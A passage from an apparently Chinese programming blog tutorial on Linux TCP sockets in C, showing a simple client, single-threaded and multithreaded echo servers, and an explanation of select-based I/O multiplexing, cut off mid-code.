class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* SERVER_IP_ADDRESS = <span class="string">&quot;192.168.66.142&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> SERVER_PORT = <span class="number">8080</span>;</span><br><span class="line">    <span class="type">uint32_t</span> SERVER_IP;</span><br><span class="line">    inet_pton(AF_INET, SERVER_IP_ADDRESS, &amp;SERVER_IP);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sad</span>;</span> <span class="comment">/* server address */</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sad, <span class="number">0</span>, <span class="keyword">sizeof</span>(sad));</span><br><span class="line">    sad.sin_family = AF_INET;</span><br><span class="line">    sad.sin_port = htons(SERVER_PORT);</span><br><span class="line">    sad.sin_addr.s_addr = SERVER_IP;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> clientSocket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (clientSocket == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;clientSocket创建失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = connect(clientSocket, (<span class="keyword">struct</span> sockaddr*)&amp;sad, <span class="keyword">sizeof</span>(sad));</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;与服务器建立连接失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(buf, <span class="string">&quot;%d: Hello World\n&quot;</span>, i++);</span><br><span class="line">        send(clientSocket, buf, <span class="built_in">strlen</span>(buf) + <span class="number">1</span>, <span class="number">0</span>); <span class="comment">/* 如果内核中写缓冲区满了会阻塞 */</span></span><br><span class="line">        <span class="comment">/* write(clientSocket, buf, strlen(buf)+1) */</span></span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf)); <span class="comment">/* 发送完了就清空准备用于接收 */</span></span><br><span class="line">        <span class="type">int</span> len = recv(clientSocket, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>); <span class="comment">/* 如果内核中读缓冲区为空会阻塞 */</span></span><br><span class="line">        <span class="comment">/* read(clientSocket, buf, sizeof(buf)) */</span></span><br><span class="line">        <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;服务器: %s&quot;</span>, buf);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(len == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;服务器断开连接...\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            perror(<span class="string">&quot;从服务器接收数据失败&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(clientSocket);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务器端代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> PORT = <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sad</span>;</span> <span class="comment">/* server address */</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sad, <span class="number">0</span>, <span class="keyword">sizeof</span>(sad));</span><br><span class="line">    sad.sin_family = AF_INET;</span><br><span class="line">    sad.sin_port = htons(PORT);</span><br><span class="line">    sad.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> welcomeSocket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (welcomeSocket == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;welcomeSocket创建失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res = bind(welcomeSocket, (<span class="keyword">struct</span> sockaddr*)&amp;sad, <span class="keyword">sizeof</span>(sad));</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;welcomeSocket绑定失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = listen(welcomeSocket, <span class="number">128</span>);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;监听失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cad</span>;</span> <span class="comment">/* client address */</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;cad, <span class="number">0</span>, <span class="keyword">sizeof</span>(cad));</span><br><span class="line">    <span class="type">socklen_t</span> cadlen = <span class="keyword">sizeof</span>(cad);</span><br><span class="line">    <span class="type">int</span> connectionSocket = accept(welcomeSocket, (<span class="keyword">struct</span> sockaddr*)&amp;cad, &amp;cadlen); <span class="comment">/* 如果连接请求队列为空会阻塞 */</span></span><br><span class="line">    <span class="keyword">if</span> (connectionSocket == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;与客户端建立连接失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> cip[<span class="number">32</span>]; <span class="comment">/* client ip */</span></span><br><span class="line">    inet_ntop(AF_INET, &amp;cad.sin_addr.s_addr, cip, <span class="keyword">sizeof</span>(cip));</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> cport = ntohs(cad.sin_port);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;与客户端[%s:%d]建立连接成功\n&quot;</span>, cip, cport);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">int</span> len = recv(connectionSocket, buf, <span class="keyword">sizeof</span>(buf) - <span class="number">1</span>, <span class="number">0</span>); <span class="comment">/* 如果内核中读缓冲区为空会阻塞 */</span></span><br><span class="line">        <span class="comment">/* read(connectionSocket, buf, sizeof(buf)) */</span></span><br><span class="line">        <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;客户端: %s&quot;</span>, buf);</span><br><span class="line">            send(connectionSocket, buf, len, <span class="number">0</span>); <span class="comment">/* 如果内核中写缓冲区满了会阻塞 */</span></span><br><span class="line">            <span class="comment">/* write(connectionSocket, buf, len) */</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(len == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;客户端断开连接...\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            perror(<span class="string">&quot;从客户端接收数据失败&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(welcomeSocket);</span><br><span class="line">    close(connectionSocket);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多线程简单高并发服务器端代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNCONNECTED -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NR_CLIENTS 128</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">client</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> connectionSocket;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">address</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">client</span> <span class="title">clients</span>[<span class="title">NR_CLIENTS</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">thread</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">client</span>* <span class="title">client</span> =</span> (<span class="keyword">struct</span> client*)arg;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> cip[<span class="number">32</span>]; <span class="comment">/* client ip */</span></span><br><span class="line">    inet_ntop(AF_INET, &amp;client-&gt;address.sin_addr.s_addr, cip, <span class="keyword">sizeof</span>(cip));</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> cport = ntohs(client-&gt;address.sin_port);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;与客户端[%s:%d]连接成功\n&quot;</span>, cip, cport);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">int</span> len = recv(client-&gt;connectionSocket, buf, <span class="keyword">sizeof</span>(buf) - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;客户端[%s:%d]: %s&quot;</span>, cip, cport, buf);</span><br><span class="line">            send(client-&gt;connectionSocket, buf, len, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(len == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;客户端[%s:%d]断开连接\n&quot;</span>, cip, cport);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">char</span> error[<span class="number">128</span>];</span><br><span class="line">            <span class="built_in">sprintf</span>(error, <span class="string">&quot;从客户端[%s:%d]接收数据失败&quot;</span>, cip, cport);</span><br><span class="line">            perror(error);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(client-&gt;connectionSocket);</span><br><span class="line">    <span class="built_in">memset</span>(client, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> client));</span><br><span class="line">    client-&gt;connectionSocket = UNCONNECTED;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> PORT = <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CLIENTS; i++) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;clients[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> client));</span><br><span class="line">        clients[i].connectionSocket = UNCONNECTED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sad</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sad, <span class="number">0</span>, <span class="keyword">sizeof</span>(sad));</span><br><span class="line">    sad.sin_family = AF_INET;</span><br><span class="line">    sad.sin_port = htons(PORT);</span><br><span class="line">    sad.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> welcomeSocket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (welcomeSocket == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;welcomeSocket创建失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res = bind(welcomeSocket, (<span class="keyword">struct</span> sockaddr*)&amp;sad, <span class="keyword">sizeof</span>(sad));</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;welcomeSocket绑定失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = listen(welcomeSocket, <span class="number">128</span>);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;监听失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">socklen_t</span> addrlen = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">client</span>* <span class="title">client</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CLIENTS; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clients[i].connectionSocket == UNCONNECTED) &#123;</span><br><span class="line">                client = &amp;clients[i];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!client) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="type">int</span> socket = accept(welcomeSocket, (<span class="keyword">struct</span> sockaddr*)&amp;client-&gt;address, &amp;addrlen);</span><br><span class="line">        client-&gt;connectionSocket = socket;</span><br><span class="line">        <span class="keyword">if</span> (socket == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;与客户端建立连接失败&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">pthread_t</span> tid;</span><br><span class="line">        pthread_create(&amp;tid, <span class="literal">NULL</span>, thread, client);</span><br><span class="line">        pthread_detach(tid); <span class="comment">/* 子线程与主线程分离，不会阻塞主线程，由操作系统回收子线程 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    close(welcomeSocket);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p><strong>IO多路复用</strong>有三种方式：<code>select</code>、<code>poll</code>、<code>epoll</code></p><p>其中只有<code>select</code>是可以跨平台的，<code>poll</code>和<code>epoll</code>只支持<code>Linux</code></p><p><code>select</code>和<code>poll</code>底层实现是线性表，<code>epoll</code>底层实现是红黑树。从效率上来看，<code>epoll</code>的事件驱动效率会高于其它两个</p><p><code>select</code>有上限限制，默认 1024。其它两个没有限制</p><p>用<code>select</code>实现<strong>IO多路复用</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> &#123;</span></span><br><span class="line">    <span class="type">time_t</span>      tv_sec;         <span class="comment">/* seconds */</span></span><br><span class="line">    <span class="type">suseconds_t</span> tv_usec;        <span class="comment">/* microseconds */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">select</span><span class="params">(<span class="type">int</span> nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, <span class="keyword">struct</span> timeval * timeout)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">大于0：成功，返回集合中已就绪的文件描述符的总个数</span></span><br><span class="line"><span class="comment">等于-1：函数调用失败</span></span><br><span class="line"><span class="comment">等于0：超时，没有检测到就绪的文件描述符</span></span><br><span class="line"><span class="comment">注意：这个函数在给定的fd集合中没有检测到就绪的文件描述符时是会阻塞的，除非设置了timeout</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将文件描述符fd从set集合中删除 == 将fd对应的标志位设置为0        </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">FD_CLR</span><span class="params">(<span class="type">int</span> fd, fd_set *<span class="built_in">set</span>)</span>;</span><br><span class="line"><span class="comment">// 判断文件描述符fd是否在set集合中 == 读一下fd对应的标志位到底是0还是1</span></span><br><span class="line"><span class="type">int</span>  <span class="title function_">FD_ISSET</span><span class="params">(<span class="type">int</span> fd, fd_set *<span class="built_in">set</span>)</span>;</span><br><span class="line"><span class="comment">// 将文件描述符fd添加到set集合中 == 将fd对应的标志位设置为1</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">FD_SET</span><span class="params">(<span class="type">int</span> fd, fd_set *<span class="built_in">set</span>)</span>;</span><br><span class="line"><span class="comment">// 将set集合中, 所有文件文件描述符对应的标志位设置为0, 集合中没有添加任何文件描述符</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">FD_ZERO</span><span class="params">(fd_set *<span class="built_in">set</span>)</span>;</span><br></pre></td></tr></table></figure><p>服务器代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NR_CLIENTS 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSGSIZE 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NFDS(fd) (fd+1) <span class="comment">/* 根据下标获取fd的个数 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> PORT = <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* listen_fd */</span></span><br><span class="line"><span class="type">int</span> lfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (lfd == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;lfd创建失败&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 初始化本地地址 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">addr.sin_family = 